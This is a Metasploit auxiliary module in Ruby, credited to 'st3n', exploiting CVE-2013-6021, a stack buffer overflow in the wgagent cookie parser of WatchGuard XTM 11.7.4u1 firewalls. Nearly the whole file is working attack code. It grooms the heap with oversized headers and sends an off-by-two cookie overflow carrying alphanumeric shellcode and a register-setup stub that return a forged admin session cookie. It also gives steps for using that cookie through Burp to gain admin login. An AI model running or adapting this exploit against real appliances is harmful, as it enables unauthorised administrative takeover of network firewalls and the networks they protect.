##
##

# copy to: modules/auxiliary/admin/http/

##
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'      => 'WatchGuard XTM(v) 11.7.4u1 - Get admin cookie ',
      'Description'  => %q{
        This module exploits a buffer overflow vulnerability inside the cookie parser of 
        the wgagent process, running on WatchGuard firewall appliances (XTM(v)).
        This module use a dedicated shellcode which repairs the stack and returns into 
        the code section in order to generate and send back a new admin cookie.
        In order to use that session cookie, fire up Burp Suite or similar, attempt to login as admin using any password,
        intercept the HTTP "response", and then replace it with the provided response.
        This module should only work against version 11.7.4u1.
      },
      'Author'       =>
        [
          'st3n (http://funoverip.net)'
        ],
      'License'    => BSD_LICENSE,
      'Version'     => '$Revision: 00001 $',
      'References'  =>
        [
          [ 'CVE', 'CVE-2013-6021' ], 
          [ 'URL', 'http://www.kb.cert.org/vuls/id/233990' ],
          [ 'URL', 'http://watchguardsecuritycenter.com/2013/10/17/xtm-11-8-secfixes/' ],
          [ 'URL', 'http://funoverip.net/2013/10/watchguard-cve-2013-6021-stack-based-buffer-overflow-exploit/'],
        ],
      ))

    register_options(
      [
        Opt::RPORT(8080),
        OptBool.new('SSL', [ true,  "Use SSL", true ]),
      ], self.class)
  end


  def run

    offByTwo = "\x44\x85"

                shellcode =
                        # shellcode: bypass password verification and return a session cookie
                        "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIMQJdYHfas030mQ" +
                        "KusPQWVoEPLKK5wtKOKOkOnkMM4HkO9okOoOePXpwuuXOsJgs4LMbWUTk1KNs04PUX" +
                        "eXD4tKTyvgQeZNGIaOgtptC78kM7X8VXGK6fWxnmPGL0MkzTKoVegxmYneidKNKOkO" +
                        "9WK5HxkNYoyoUPuP7pGpNkCpvlk9k5UPIoKO9oLKnmL4KNyoKOlKk5qx9nioioLKNu" +
                        "RLKNioYoMY3ttdc4NipTq4VhMYTL14NazLxPERuP30oqzMn0G54OuPmkXtyOeUtHlK" +
                        "sevhnkRrc8HGW47TeTwpuPEPgpNi4TwTMnNpZyuTgxKOn6K90ELPNkQU7xLKg0r4oy" +
                        "ctQ45TlMK35EISKOYoMYWt14MnppMfUTWxYohVk3KpuWMY0Empkw0ENXwtgpuPC0lK" +
                        "benpLKSpF0IWPDQ4Fh30s0Wp5PlMmCrMo3KO9olIpTUts4nic44dMnqnyPUTTHKOn6" +
                        "LIbeLXSVIW0EMvVb5PKw3uNt7pgpWpuPiWpEnluPWpwpGpOO0KzN34S8kOm7A";



                # Shellocde max length
                shellcode_max_len = 2000;

    # Is a WatchGuard appliance ?
    print_status("Sending HTTP ping request")
    if not is_watchguard
      print_error("Could not get 'pong' response")
      return nil
    end

    # Heap messaging
    print_status("Heap messaging ...")
    if not heap_messaging
      return nil
    end

    # Sending exploit
    print_status("Sending authentication bypass shellcode")
    res = send_request2(shellcode, shellcode_max_len, offByTwo)  
    if res
      # Code 200 ?
      if res.code == 200
                                print_status("Printing HTTP response")
                                print '-' * 60 + "\n"
                                print ("#{res.cmd_string}")
                                print ("#{res.headers}")
                                print ("")
                                print ("#{res.body}")
                                print '-' * 60 + "\n"

        # Admin already logged ?
        if res.body.match(/admin is currently logged/m)
          print_warning("Exploit succeeded but admin is already logged")
        # Got session cookie ?
        elsif res.to_s.match(/sessionid=/m)
                                        print_good("Exploit succeeded")
          print_good("Now, intercept the HTTP response of a failed login attempt (using BurpSuite), and replace it with this HTTP response")
          print_good("See example at http://funoverip.net/2013/10/watchguard-cve-2013-6021-stack-based-buffer-overflow-exploit/'")
        else
          print_status("unknown answer")
                                end
      else
        print_error("Expected HTTP code 200, but got #{res.code}. Try again ?")
      end
    end


  end

  # Heap messaging.
  # send request1 5 times
  def heap_messaging
    for i in 0..5
                  res = send_request1
                  if not res or res.code != 200
                          print_error("Expecting HTTP 200 code but got '#{res.code} #{(res.message and res.message.length > 0) ? ' ' + res.message : ''}'")
                          return false
                  end
    end
    return true
  end



  def send_request1
                request1_uri            = '/agent/ping'
                request1_user_agent     = 'a' * 100 + 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0  ' + 'a' * 100
                request1_accept         = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8, ' + 'a' * 992
                request1_accept_language= 'en-gb,en;q=0.5' + 'a' * 200
                request1_content_type   = 'application/xml'
                request1_cookie         = 'sessionid=' + 'A' * 120
                request1_accept_charset = 'utf-8'
                request1_post_data      = 'foo'

                res = send_request_cgi({
                        'method'        =>      'POST',
                        'uri'           =>      request1_uri,
                        'ctype'         =>      request1_content_type,
                        'agent'         =>      request1_user_agent,
                        'headers'       =>      {
                                                        'Accept'                =>      request1_accept,
                                                        'Accept-Language'       =>      request1_accept_language,
                                                        'Cookie'                =>      request1_cookie,
                                                        'Accept-Charset'        =>      request1_accept_charset,
                                                },
                        'data'          =>      request1_post_data,
                })

    if not res
      print_error("HTTP request failed")
      return nil
    end
    return res
  end


  def send_request2(shellcode, shellcode_max_len, offByTwo)

    # our buffer is like this
    # NOPs + ALPHA_ECX24 + SHELLOCDE
  
    # where:
    #  - NOP     = '\x4a'  (dec edx). EDX = 0 at the beginning
    #  - ALPHA_ESI24  = set the address of the shellcode in EAX 
    #        - EAX = [ECX+0x24]
    #        - EAX = EAX - EDX (edx was decremented by nopsled)
    #        - EAX = EAX + length(ALPHA_ECX24)
    #  - SHELLOCDE  = ....

    alpha2_ecx24 =
      # set our shellcode address into EAX (expected by alpha2 encoder)
      "\x8b\x41\x24" +  # mov    eax, [ecx+0x24]
      "\x29\xd0" +            # sub    eax, edx ; (edx is updated by nopsled)
      "\x83\xc0\x40" +        # add    eax, 0x40
      "\x83\xe8\x35"          # sub    eax, 0x35
    # for the reader, "add eax, edx" contains bad chars. This is the reason why the nopsled decrement EDX and that we use "dec eax, edx"



                request2_sessionid      = 'A' * 140 + offByTwo

                request2_post_data      = "<methodCall><methodName>login</methodName><params><param><value><struct><member>"
                request2_post_data      << "<name>password</name><value><string>foo</string></value></member><member>"
                request2_post_data      << "<name>user</name><value><string>admin</string></value></member></struct></value>"
                request2_post_data      << "</param></params></methodCall>"

                request2_uri            = '/agent/ping'
                request2_user_agent     = 'a' * 1879
                request2_accept_encoding= 'identity,' + 'b' * 1386
                request2_connection     = 'keep-alive'  + 'a' * 22
    request2_connection  << "\x4a" * (shellcode_max_len - shellcode.length - alpha2_ecx24.length)
                request2_connection     << alpha2_ecx24 
                request2_connection     << shellcode 
                request2_content_type   = 'application/xml'
                request2_cookie         = 'sessionid=' + request2_sessionid
                request2_accept_charset = 'utf-8'


                res = send_request_cgi({
                        'method'        =>      'POST',
                        'uri'           =>      request2_uri,
                        'ctype'         =>      request2_content_type,
                        'agent'         =>      request2_user_agent,
                        'connection'    =>      request2_connection,
                        'headers'       =>      {
                                                        'Accept-Encoding'       =>      request2_accept_encoding,
                                                        'Cookie'                =>      request2_cookie,
                                                        'Accept-Charset'        =>      request2_accept_charset,
                                                },
                        'data'          =>      request2_post_data,
                })

                return res


  end

  def is_watchguard

                res = send_request_cgi({
                        'method'        =>      'GET',
                        'uri'           =>      '/ping',
                })
    if not res
      return false
    end

    if res.code == 200 and res.body.match(/pong/m)
      return true
    else
      return false
    end
  end

end
